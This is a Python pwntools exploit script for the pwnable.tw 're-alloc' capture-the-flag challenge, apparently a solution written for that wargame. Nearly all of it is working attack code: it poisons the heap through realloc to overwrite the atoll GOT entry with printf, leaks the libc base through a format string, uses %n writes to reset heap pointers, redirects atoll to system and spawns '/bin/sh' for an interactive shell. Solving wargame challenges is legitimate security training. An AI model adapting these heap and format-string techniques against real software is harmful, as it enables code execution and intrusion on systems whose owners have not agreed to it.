from pwn import *


context.terminal = ['tmux', 'neww', '-d', '-n', 'dbg']
# context.log_level = 'debug'

realloc = ELF('re-alloc')
libc = ELF('libc.so')


class Prompts:
    CHOICE = 'Your choice: '
    INDEX = 'Index:'
    SIZE = 'Size:'
    DATA = 'Data:'


class Choices:
    ALLOC = '1'
    REALLOC = '2'
    FREE = '3'


p = remote('chall.pwnable.tw', 10106)
# p = gdb.debug(
#     realloc.path,
#     '''
#     define hook-stop
#     x/2gx &heap
#     end
#
#     # b *allocate+0xb5
#     # b *reallocate+0xc2
#     # b *rfree+0x55
#
#     # b *read_long+0x3e
#     c
#     ''',
#     env=dict(LD_PRELOAD=libc.path)
# )

DEFAULT_SIZE = 0x30
HEAP_PTRS = 0x4040b0


def alloc_chunk(index, size=DEFAULT_SIZE, data=None, printf_mode=False):
    print(f'[*] allocating a chunk', f'index: {index}')
    p.sendlineafter(Prompts.CHOICE, Choices.ALLOC)
    if not printf_mode:
        p.sendafter(Prompts.INDEX, str(index))
        p.sendafter(Prompts.SIZE, str(size))
    else:
        p.sendafter(Prompts.INDEX, f'%{index}c\x00' if index else '\x00')
        p.sendafter(Prompts.SIZE, f'%{size}c\x00' if size else '\x00')

    p.sendafter(Prompts.DATA, data if data else 'A' * size)


def free_chunk(index, printf_mode=False):
    print(f'[*] freeing a chunk', f'index: {index}')
    p.sendlineafter(Prompts.CHOICE, Choices.FREE)
    if not printf_mode:
        p.sendafter(Prompts.INDEX, str(index))
    else:
        p.sendafter(Prompts.INDEX, f'%{index}c\x00' if index else '\x00')


def realloc_chunk(index, size=DEFAULT_SIZE, data=None, printf_mode=False):
    print('[*] reallocating a chunk',
          f'index: {index}', f'size: {size}', f'data: {data}')
    p.sendlineafter(Prompts.CHOICE, Choices.REALLOC)
    if not printf_mode:
        p.sendafter(Prompts.INDEX, str(index))
        p.sendafter(Prompts.SIZE, str(size))
    else:
        p.sendafter(Prompts.INDEX, f'%{index}c\x00' if index else '\x00')
        p.sendafter(Prompts.SIZE, f'%{size}c\x00' if size else '\x00')
    if size:
        p.sendafter(Prompts.DATA, data if data else 'B' * size)


def reset_ptrs():
    p.sendlineafter(Prompts.CHOICE, Choices.FREE)
    p.sendafter(Prompts.INDEX, b'%9$n'.ljust(0x8, b'A') + p64(HEAP_PTRS))
    p.sendlineafter(Prompts.CHOICE, Choices.FREE)
    p.sendafter(Prompts.INDEX, b'%9$n'.ljust(0x8, b'A') + p64(HEAP_PTRS + 8))


def overwrite_atoll_with_printf():
    alloc_chunk(0)
    realloc_chunk(0, 0)
    realloc_chunk(0, data=p64(realloc.got['atoll']))
    print('[*] Pulling a forged chunk from the bin with `atoll` as the forward chunk')
    alloc_chunk(1)
    realloc_chunk(1, DEFAULT_SIZE * 2)
    free_chunk(1)
    alloc_chunk(1, data=p64(realloc.sym['printf']))


def overwrite_atoll_with_system():
    new_size = 0x20
    alloc_chunk(0, size=new_size, printf_mode=True)
    realloc_chunk(0, size=0, printf_mode=True)
    realloc_chunk(0, size=new_size, data=p64(
        realloc.got['atoll']), printf_mode=True)
    print('[*] Pulling a forged chunk from the bin with `atoll` as the forward chunk')
    alloc_chunk(1, size=new_size, printf_mode=True)
    realloc_chunk(1, new_size * 2, printf_mode=True)
    free_chunk(1,  printf_mode=True)
    alloc_chunk(1, size=new_size, data=p64(
        libc.sym['system']), printf_mode=True)


def leak_libc():
    p.sendlineafter(Prompts.CHOICE, Choices.FREE)
    p.sendafter(Prompts.INDEX, '%7$p')
    libc.address = int(p.recvn(0xe), 16) - 0x1e5760
    print(f'[*] libc base address: {hex(libc.address)}')


def call_system():
    p.sendlineafter(Prompts.CHOICE, Choices.FREE)
    p.sendafter(Prompts.INDEX, '/bin/sh\x00')
    p.interactive()


def exploit():
    overwrite_atoll_with_printf()
    leak_libc()
    reset_ptrs()
    overwrite_atoll_with_system()
    call_system()


if __name__ == "__main__":
    exploit()
